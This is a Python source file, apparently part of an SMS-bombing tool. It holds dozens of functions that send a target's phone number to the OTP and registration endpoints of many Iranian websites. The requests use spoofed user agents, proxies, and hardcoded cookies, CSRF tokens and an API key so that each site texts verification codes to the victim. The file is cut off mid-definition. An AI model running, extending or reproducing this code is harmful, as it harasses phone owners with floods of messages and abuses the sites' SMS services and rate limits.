def tagmond(num, proxies):

    rhead = {"user-agent": generate_user_agent()}
    post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+num+'&g-recaptcha-response=', headers=rhead)

@handler.sms_api
def doctoreto(num, proxies):
    post('https://api.doctoreto.com/api/web/patient/v1/accounts/register', 

    json={"mobile": "0"+num, "country_id": 205}, 

    headers={'Connection': 'keep-alive','Accept': 'application/json','X-Requested-With': 'XMLHttpRequest','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://doctoreto.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://doctoreto.com/','Accept-Language': 'en-US,en;q=0.9'})

@handler.sms_api
def olgoo(num, proxies):
    olD = {'contactInfo[mobile]': '0'+num,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
    olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
    olH = {'Accept': 'text/plain, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '163','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5','Host': 'www.olgoobooks.ir','Origin': 'https://www.olgoobooks.ir','Referer': 'https://www.olgoobooks.ir/sn/userRegistration/','X-Requested-With': 'XMLHttpRequest','user-agent': generate_user_agent(os="linux")}
    post(proxies=proxies, url=olU, headers=olH, data=olD).text


@handler.sms_api
def pakhsh(num, proxies):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
    paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d','origin': 'https://www.pakhsh.shop','referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url=paU, headers=paH, data=paD)


@handler.sms_api
def didnegar(num, proxies):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{num}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
    paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true','origin': 'https://www.didnegar.com','referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url=paU, headers=paH, data=paD)

@handler.sms_api
def see5(num, proxies):
    seD = {'mobile': '0'+num,'action': 'sendsms'}
    seU = 'https://crm.see5.net/api_ajax/sendotp.php'
    seH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c','origin': 'https://crm.see5.net','referer': 'https://crm.see5.net/clientarea.php','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url=seU, headers=seH, data=seD)

@handler.sms_api
def ghabzino(num, proxies):
    ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+num}}
    ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    ghH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': generate_user_agent(os="linux")}
    get(proxies=proxies, url=ghU, headers=ghH, json=ghJ)

@handler.sms_api
def simkhan(num, proxies):
    ghJ = {"mobileNumber": '0'+num,"ReSendSMS": False}
    ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
    ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
    post(proxies=proxies, url=ghU, headers=ghH, json=ghJ)

@handler.sms_api
def drsaina(num, proxies):
    ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+num}&confirmCode=&fullName=&Password=&Password2="
    ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
    ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
    post(proxies=proxies, url=ghU, headers=ghH, data=ghD).text

@handler.sms_api
def limome(num, proxies):
    liD = {'mobileNumber': num,'country': '1'}
    liU = 'https://my.limoome.com/api/auth/login/otp'
    liH = {'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1','Host': 'my.limoome.com','Origin': 'https://my.limoome.com','Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment','User-Agent': generate_user_agent(os="linux"),'X-Requested-With': 'XMLHttpRequest'}
    post(proxies=proxies, url=liU, headers=liH, data=liD)

@handler.sms_api
def devsloop(num, proxies):
    n4 = f"number=0{num}&state=number&"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8","User-Agent": generate_user_agent(os="android"), "Host": "i.devslop.app", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Length": "32"}
    post(proxies=proxies, url="https://i.devslop.app/app/ifollow/api/otp.php", headers=headers, data=n4)

@handler.sms_api
def hiword(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    n4 = {"identifier": "0"+num}
    post(proxies=proxies, url="https://hiword.ir/wp-json/otp-login/v1/login", data=n4, headers=rhead)

@handler.sms_api
def behzadshami(num, proxies): 
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail={num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb"
    rhead = {'content-length': '142', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?1', 'user-agent': generate_user_agent(os="android"), 'sec-ch-ua-platform': '"Android"', 'origin': 'https://behzadshami.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://behzadshami.com/my-account/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': 'digits_countrycode=98'}
    post(proxies=proxies, url="https://behzadshami.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

@handler.sms_api
def ghasedak24(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    n4 = {"username": "0"+num}
    post(proxies=proxies, url="https://ghasedak24.com/user/ajax_register", data=n4, headers=rhead)

@handler.sms_api
def iranketab(num, proxies):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"UserName": "0"+num}
        post(proxies=proxies, url="https://www.iranketab.ir/account/register", data=n4, headers=rhead)

@handler.sms_api
def ketabchi(num, proxies):
    rhead = {"user-agent": generate_user_agent()}
    n4 = {"phoneNumber": "0"+num}
    post(proxies=proxies, url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=n4, headers=rhead)

@handler.sms_api
def takfarsh(num, proxies):
    n4 = {"phone_email": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=n4, headers=rhead)
            
@handler.sms_api
def dadpardaz(num, proxies):
    n4 = {"mobile": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=n4, headers=rhead)
            
@handler.sms_api
def iranicard(num, proxies):
    n4 = {"mobile": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.iranicard.ir/api/v1/register", data=n4, headers=rhead)
            
@handler.sms_api
def pubgsell(num, proxies):
        rhead = {"user-agent": generate_user_agent()}
        post(proxies=proxies, url=f"https://pubg-sell.ir/loginuser?username=0{num}", headers=rhead)
            
@handler.sms_api
def tj8(num, proxies):
    n4 = {"mobile": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://tj8.ir/auth/register", data=n4, headers=rhead)

@handler.sms_api
def mashinbank(num, proxies):
    n4 = {"mobileNumber": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
            
@handler.sms_api
def cinematicket(num, proxies):
    n4 = {"phone_number": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://cinematicket.org/api/v1/users/signup", data=n4, headers=rhead)
            
@handler.sms_api
def kafegheymat(num, proxies):
    n4 = {"phone": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://kafegheymat.com/shop/getLoginSms", data=n4, headers=rhead)

@handler.sms_api
def snappexpress(num, proxies):
    n4 = {"cellphone": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=n4, headers=rhead)

@handler.sms_api
def opco(num, proxies):
    n4 = {"telephone": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=n4, headers=rhead)


@handler.sms_api
def melix(num, proxies):
    n4 = {"mobile": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://melix.shop/site/api/v1/user/otp", json=n4, headers=rhead)
            
@handler.sms_api
def safiran(num, proxies):
    n4 = {"mobile": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://safiran.shop/login", json=n4, headers=rhead)
    

@handler.sms_api
def pirankalaco(num, proxies):
    head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://pirankalaco.ir','Referer': 'https://pirankalaco.ir/shop/login.php','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{num}",headers=head)
            
@handler.sms_api
def tnovin(num, proxies):
    head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'shop.tnovin.com','Origin': 'http://shop.tnovin.com','Referer': 'http://shop.tnovin.com/login','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="http://shop.tnovin.com/login",data=f"phone=0{num}",headers=head)
            
@handler.sms_api
def dastakht(num, proxies):
    n4 = {"mobile": num,"countryCode":98,"device_os":2}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
            
@handler.sms_api
def hamlex(num, proxies):
    n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{num}&register="
    h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '61','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://hamlex.ir','Referer': 'https://hamlex.ir/register.php','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','User-Agent': generate_user_agent(os="win")}
    post(proxies=proxies, url="https://hamlex.ir/register.php",data=n4,headers=h4)
            
@handler.sms_api
def irwco(num, proxies):
    n4 =  f"mobile=0{num}"
    h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '18','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://irwco.ir','Referer': 'https://irwco.ir/register','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'X-Requested-Rith': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://irwco.ir/register",data=n4,headers=h4)


@handler.sms_api
def moshaveran724(num, proxies):
    n4 =  f"againkey=0{num}&cache=false"
    h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '32','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://moshaveran724.ir','Referer': 'https://moshaveran724.ir/user/register/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://moshaveran724.ir/m/pms.php",data=n4,headers=h4)

@handler.sms_api
def sibbank(num, proxies):
    n4 = {"phone_number": "0" + num}
    h4 = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.5','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.sibbank.ir','origin': 'https://sibbank.ir','referer': 'https://sibbank.ir/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','TE': 'trailers','user-agent': generate_user_agent(os="mac")}
    post(proxies=proxies, url="https://api.sibbank.ir/v1/auth/login",json=n4,headers=h4)
                        

@handler.sms_api
def steelalborz(num, proxies):
    n4 = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
    h4 = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://steelalborz.com','referer': 'https://steelalborz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsteelalborz.com%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://steelalborz.com/wp-admin/admin-ajax.php",data=n4,headers=h4)
    
@handler.sms_api
def arshian(num, proxies):
    n4 = {"country_code":"98","phone_number": num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.arshiyan.com/send_code",json=n4, headers=rhead)


@handler.sms_api
def topnoor(num, proxies):
    n4 = {"mobile":"0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://backend.topnoor.ir/web/v1/user/otp",json=n4, headers=rhead)

@handler.sms_api
def alinance(num, proxies):
    n4 =  {"phone_number":"0"+num}
    
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.alinance.com/user/register/mobile/send/",json=n4, headers=rhead)
            

@handler.sms_api
def alopeyk(num, proxies):
    n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=n4, headers=rhead)

@handler.sms_api
def alopeyksafir(num, proxies):
    n4 = {'phone':'0'+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.alopeyk.com/safir-service/api/v1/login",json=n4, headers=rhead)
               
@handler.sms_api
def chaymarket(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.chaymarket.com','referer': 'https://www.chaymarket.com/user/my-account/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def coffefastfoodluxury(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"

    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://coffefastfoodluxury.ir','referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)


@handler.sms_api
def dosma(num, proxies):
    n4 = {"username":"0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://app.dosma.ir/sendverify/",json=n4, headers=rhead)


@handler.sms_api
def ehteraman(num, proxies):
    n4 = {"mobile":"0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://api.ehteraman.com/api/request/otp",json=n4, headers=rhead)

@handler.sms_api
def mcishop(num, proxies):
    n4 = {"msisdn":num}
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
    post(proxies=proxies, url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
            
@handler.sms_api
def hamrahbours(num, proxies):
    n4 = {"MobileNumber":"0"+num}
    rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
    post(proxies=proxies, url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
            
@handler.sms_api
def homtick(num, proxies):
    n4 = {"mobileOrEmail":"0"+num,"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=n4, headers=rhead)
            
@handler.sms_api
def iranamlaak(num, proxies):
    n4 = {"AgencyMobile":"0"+num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=n4, headers=rhead)
            
@handler.sms_api
def karchidari(num, proxies):
    n4 = {"mobile":"0"+num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://api.kcd.app/api/v1/auth/login",json=n4, headers=rhead)
            
@handler.sms_api
def mazoo(num, proxies):
    n4 = {"phone":num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://mazoocandle.ir/login",json=n4, headers=rhead)
            
@handler.sms_api
def paymishe(num, proxies):
    n4 = {"mobile":"0"+num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
            
@handler.sms_api
def podro(num, proxies):
    n4 = {"mobile":"0"+num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
            
@handler.sms_api
def rayshomar(num, proxies):
    n4 = f"MobileNumber=0{num}"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','app-version': '2.0.6','content-length': '24','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','language': 'fa','origin': 'https://app.rayshomar.ir','os-type': 'webapp','referer': 'https://app.rayshomar.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
    post(proxies=proxies, url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=n4, headers=rhead)

@handler.sms_api
def amoomilad(num, proxies):
    n4 = {"Token":"5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+num,"Helper":77942}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=n4, headers=rhead)

@handler.sms_api
def ashrafi(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={num}&dig_otp=&dig_nounce=54dfdabe34"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '203','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://ashraafi.com','referer': 'https://ashraafi.com/login-register/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}

    post(proxies=proxies, url="https://ashraafi.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

@handler.sms_api
def bandarazad(num, proxies):
